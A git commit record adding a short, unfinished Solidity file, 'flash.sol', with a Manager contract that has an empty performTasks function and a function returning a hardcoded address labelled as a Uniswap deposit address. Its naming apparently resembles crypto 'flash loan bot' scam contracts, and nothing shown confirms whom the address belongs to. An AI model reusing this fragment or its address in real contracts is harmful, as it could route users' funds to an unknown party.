80bd73e7246574ee5d5cc3c7ea5bd5037482003a
Scypher55 <109288840+Scypher55@users.noreply.github.com>
2022-07-14 13:31:53 +0100

    Add files via upload

---
+++ flash.sol
@@ -0,0 +1,10 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+        function performTasks() public {
+
+        }
+
+        function uniswapDepositAddress() public pure returns (address) {
+                return 0x1FF6a243122E5d10CC08Da6357B93C98a55fF1c3;
+        }
